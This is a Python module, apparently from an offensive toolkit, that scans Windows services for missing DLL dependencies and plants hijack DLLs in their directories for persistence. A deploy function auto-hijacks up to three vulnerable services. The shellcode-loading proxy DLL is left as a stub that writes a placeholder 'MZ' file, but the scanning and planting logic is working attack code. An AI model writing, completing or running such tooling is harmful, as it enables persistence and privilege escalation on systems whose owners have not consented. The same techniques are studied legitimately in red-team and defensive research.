"""
Service DLL Hijacking Module
Implements DLL hijacking for services with missing or exploitable DLL dependencies
"""

import os
import sys
import json
import logging
from typing import Optional, List, Dict, Tuple
import subprocess

logger = logging.getLogger('ServiceDLLHijacking')


class ServiceDLLScanner:
    """
    Scans Windows services for missing or hijackable DLL dependencies.
    
    Strategy:
    1. Query all running services via WMI/Windows API
    2. Extract service executable path
    3. Identify DLL dependencies (imports)
    4. Check for missing DLLs in search path
    5. Find writable locations where malicious DLL can be placed
    """
    
    @staticmethod
    def get_all_services() -> List[Dict[str, str]]:
        """
        Get list of all Windows services.
        
        Returns:
            List of dictionaries with service information
        """
        if sys.platform != "win32":
            logger.warning("Service enumeration only works on Windows")
            return []
        
        services = []
        try:
            import subprocess
            
            # Use wmic to query services
            result = subprocess.run(
                ['wmic', 'service', 'list', 'brief'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode != 0:
                logger.error(f"Failed to enumerate services: {result.stderr}")
                return []
            
            # Parse output
            lines = result.stdout.strip().split('\n')[1:]  # Skip header
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    services.append({
                        "name": parts[0],
                        "state": parts[1] if len(parts) > 1 else "Unknown"
                    })
        
        except Exception as e:
            logger.error(f"Error enumerating services: {e}")
        
        return services
    
    @staticmethod
    def get_service_details(service_name: str) -> Optional[Dict[str, str]]:
        """
        Get detailed information about a specific service.
        
        Args:
            service_name: Name of the service
        
        Returns:
            Dictionary with service details (path, dependencies, etc.)
        """
        if sys.platform != "win32":
            return None
        
        try:
            import subprocess
            
            # Query service path
            result = subprocess.run(
                ['wmic', 'service', 'where', f'name="{service_name}"', 
                 'get', 'pathname,name,displayname', '/format:json'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0 and result.stdout:
                data = json.loads(result.stdout)
                if data['returnValue'] == 0 and data.get('Items'):
                    item = data['Items'][0]
                    return {
                        "name": item.get('Name', service_name),
                        "displayname": item.get('DisplayName', ''),
                        "pathname": item.get('PathName', ''),
                    }
        except Exception as e:
            logger.error(f"Error getting service details for {service_name}: {e}")
        
        return None
    
    @staticmethod
    def extract_dll_dependencies(executable_path: str) -> List[str]:
        """
        Extract DLL dependencies from executable file.
        
        Args:
            executable_path: Path to executable
        
        Returns:
            List of DLL names required by executable
        """
        dlls = []
        
        try:
            # Try to use Dependency Walker (if available)
            import subprocess
            
            # Use dumpbin (MSVC tool) if available
            result = subprocess.run(
                ['dumpbin', '/imports', executable_path],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                # Parse dumpbin output
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if line.endswith('.dll'):
                        dll_name = line.split()[-1]
                        dlls.append(dll_name)
        except FileNotFoundError:
            # dumpbin not available, try alternative approach
            logger.debug("dumpbin not found, trying alternative DLL detection")
            
            # Use PE file parsing if available
            try:
                import pefile
                pe = pefile.PE(executable_path)
                for imp in pe.DIRECTORY_ENTRY_IMPORT:
                    dlls.append(imp.dll.decode() if isinstance(imp.dll, bytes) else imp.dll)
            except ImportError:
                logger.warning("pefile module not available for DLL extraction")
            except Exception as e:
                logger.error(f"Error parsing PE file {executable_path}: {e}")
        except Exception as e:
            logger.error(f"Error extracting DLL dependencies: {e}")
        
        return dlls
    
    @staticmethod
    def find_missing_dlls(executable_path: str) -> List[Tuple[str, str]]:
        """
        Find missing DLLs in service executable's dependency chain.
        Missing DLLs can be hijacked by placing malicious DLL in search path.
        
        Args:
            executable_path: Path to executable
        
        Returns:
            List of tuples (dll_name, search_path_candidate)
        """
        missing_dlls = []
        
        try:
            dll_list = ServiceDLLScanner.extract_dll_dependencies(executable_path)
            
            # Get service's directory
            service_dir = os.path.dirname(executable_path)
            
            # Check for missing DLLs in service directory
            for dll_name in dll_list:
                dll_path = os.path.join(service_dir, dll_name)
                if not os.path.exists(dll_path):
                    # Check if it's in standard system32
                    system_dll = os.path.join("C:\\Windows\\System32", dll_name)
                    if not os.path.exists(system_dll):
                        missing_dlls.append((dll_name, service_dir))
                        logger.info(f"Found missing DLL: {dll_name} for service {executable_path}")
        
        except Exception as e:
            logger.error(f"Error finding missing DLLs: {e}")
        
        return missing_dlls
    
    @staticmethod
    def check_dll_hijacking_opportunity(service_name: str) -> Optional[Dict[str, any]]:
        """
        Check if a service has DLL hijacking opportunity.
        
        Args:
            service_name: Name of the service
        
        Returns:
            Dictionary with hijacking opportunity details, None if not vulnerable
        """
        try:
            service_details = ServiceDLLScanner.get_service_details(service_name)
            if not service_details or not service_details.get("pathname"):
                return None
            
            # Extract executable path (remove quotes and parameters)
            exec_path = service_details["pathname"].strip('"').split()[0]
            
            if not os.path.exists(exec_path):
                return None
            
            # Find missing DLLs
            missing_dlls = ServiceDLLScanner.find_missing_dlls(exec_path)
            
            if missing_dlls:
                return {
                    "service_name": service_name,
                    "executable": exec_path,
                    "executable_dir": os.path.dirname(exec_path),
                    "missing_dlls": missing_dlls,
                    "is_vulnerable": True,
                    "hijack_candidates": [dll[1] for dll in missing_dlls]
                }
        
        except Exception as e:
            logger.error(f"Error checking DLL hijacking for {service_name}: {e}")
        
        return None
    
    @staticmethod
    def scan_all_services_for_hijacking() -> List[Dict]:
        """
        Scan all services for DLL hijacking opportunities.
        
        Returns:
            List of vulnerable services with hijacking details
        """
        vulnerable_services = []
        services = ServiceDLLScanner.get_all_services()
        
        for service in services:
            hijacking_info = ServiceDLLScanner.check_dll_hijacking_opportunity(service["name"])
            if hijacking_info:
                vulnerable_services.append(hijacking_info)
        
        logger.info(f"Found {len(vulnerable_services)} services with DLL hijacking opportunities")
        return vulnerable_services


class DLLHijackingPayload:
    """
    Creates and manages DLL hijacking payloads.
    """
    
    @staticmethod
    def create_proxy_dll_shellcode(target_dll: str, payload_shellcode: bytes) -> bytes:
        """
        Create proxy DLL that:
        1. Loads the legitimate DLL
        2. Executes payload shellcode
        3. Passes control to legitimate functions
        
        Args:
            target_dll: Name of legitimate DLL to proxy
            payload_shellcode: Shellcode to execute
        
        Returns:
            DLL binary content
        """
        # This would require actual DLL generation/modification
        # For now, return a marker implementation
        logger.warning("DLL generation requires PE file manipulation - implement with pefile or direct binary construction")
        return b""
    
    @staticmethod
    def place_hijack_dll(dll_path: str, dll_content: bytes, 
                        target_service: str, target_dll: str) -> bool:
        """
        Place hijack DLL in target location.
        
        Args:
            dll_path: Target path for hijack DLL
            dll_content: DLL binary content
            target_service: Service name being hijacked
            target_dll: Original DLL being proxied
        
        Returns:
            True if successful, False otherwise
        """
        try:
            # Create directory if needed
            dll_dir = os.path.dirname(dll_path)
            os.makedirs(dll_dir, exist_ok=True)
            
            # Write DLL
            with open(dll_path, 'wb') as f:
                f.write(dll_content)
            
            # Set appropriate permissions
            os.chmod(dll_path, 0o755)
            
            logger.info(f"Placed hijack DLL at {dll_path} for service {target_service}")
            return True
        
        except Exception as e:
            logger.error(f"Failed to place hijack DLL: {e}")
            return False
    
    @staticmethod
    def create_hijacking_opportunity(service_name: str, dll_to_hijack: str,
                                     payload_shellcode: Optional[bytes] = None) -> bool:
        """
        Create DLL hijacking opportunity for a specific service.
        
        Args:
            service_name: Target service name
            dll_to_hijack: DLL filename to hijack
            payload_shellcode: Optional shellcode to execute
        
        Returns:
            True if hijacking dll created successfully
        """
        try:
            # Find service details
            service_details = ServiceDLLScanner.get_service_details(service_name)
            if not service_details:
                return False
            
            # Build target DLL path (in service directory)
            service_dir = os.path.dirname(service_details["pathname"].strip('"'))
            hijack_dll_path = os.path.join(service_dir, dll_to_hijack)
            
            # Create proxy DLL payload
            dll_payload = DLLHijackingPayload.create_proxy_dll_shellcode(dll_to_hijack, 
                                                                         payload_shellcode or b"")
            
            if not dll_payload:
                logger.warning("DLL payload generation failed, using stub")
                # For demonstration, create a minimal stub
                dll_payload = b"MZ" + b"\x00" * 1024  # Simplified stub
            
            # Place the hijack DLL
            return DLLHijackingPayload.place_hijack_dll(hijack_dll_path, dll_payload,
                                                       service_name, dll_to_hijack)
        
        except Exception as e:
            logger.error(f"Error creating DLL hijacking opportunity: {e}")
            return False


class ServicePersistenceManager:
    """
    Unified service-based persistence management.
    """
    
    @staticmethod
    def deploy_service_dll_hijacking() -> Dict[str, any]:
        """
        Scan for DLL hijacking opportunities and deploy hijacks.
        
        Returns:
            Dictionary with scan results and deployment status
        """
        results = {
            "vulnerable_services": [],
            "deployed_hijacks": [],
            "errors": []
        }
        
        try:
            # Scan all services
            vulnerable = ServiceDLLScanner.scan_all_services_for_hijacking()
            results["vulnerable_services"] = vulnerable
            
            # Deploy hijacks on first few services
            for service_info in vulnerable[:3]:  # Limit to first 3
                try:
                    for dll_name, _ in service_info["missing_dlls"]:
                        success = DLLHijackingPayload.create_hijacking_opportunity(
                            service_info["service_name"],
                            dll_name
                        )
                        if success:
                            results["deployed_hijacks"].append({
                                "service": service_info["service_name"],
                                "dll": dll_name
                            })
                except Exception as e:
                    results["errors"].append(f"Failed to hijack {service_info['service_name']}: {e}")
        
        except Exception as e:
            results["errors"].append(f"General error in service hijacking: {e}")
            logger.error(f"Service hijacking deployment failed: {e}")
        
        logger.info(f"Service hijacking deployment results: {results}")
        return results
